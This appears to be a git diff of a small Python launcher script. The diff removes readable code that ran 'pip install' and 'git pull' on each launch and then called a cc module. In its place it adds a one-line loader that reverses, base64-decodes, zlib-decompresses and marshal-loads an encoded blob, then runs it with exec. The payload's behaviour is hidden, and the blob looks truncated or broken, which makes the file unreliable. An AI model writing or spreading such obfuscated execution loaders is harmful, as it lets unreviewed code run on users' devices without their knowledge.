@@ -1,22 +1,5 @@
-import os
-import platform
-import time
-import cc
-os.system("pip install requests")
-fuck = platform.architecture()[0]
-if fuck == '64bit':
-    os.system('git pull')
-    os.system('clear')
-    print('[•] YOUR DEVICE IS 64 BIT')
-    time.sleep(2)
-    from cc import cc
-    cc()
-if fuck == '32bit':
-    os.system('git pull')
-    os.system('clear')
-    print('[•] YOUR DEVICE IS 32 BIT')
-    time.sleep(2)
-    from cc import cc
-    cc() 
-os.system('clear')
-print('\x1b[1;97m Soon Your Device Supported Tools ')
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Sat Oct  3 14:56:19 2026
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'kGCr0DQKAxWRSzwaJbQRkPoOnn5qBOZegsMvkRmZgxHSMgFuBiRxAEXFaTq5Ueq5kjdcuxuKth5tlDyzGqE/890qY+HkAB0Y8y3TWUusEwFnUWsvkNt8QuCmnRIf8x3VWE/kHBxSzbygyMJEDxDnYCAYyA7BKFIMkRVZIeGlhxCYwTG9ihwYICGaQ2ws6DFTCAkZLxJe'))
